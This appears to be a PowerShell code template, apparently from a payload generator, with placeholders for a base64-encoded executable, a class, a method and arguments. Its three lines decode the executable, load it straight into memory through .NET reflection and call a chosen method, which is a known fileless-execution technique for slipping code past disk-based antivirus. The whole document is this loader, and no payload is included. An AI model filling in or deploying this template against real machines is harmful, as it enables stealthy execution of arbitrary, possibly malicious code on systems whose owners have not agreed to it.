$y = "{{b64_exe}}"
[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($y))
[{{class}}]::{{method}}({{args}})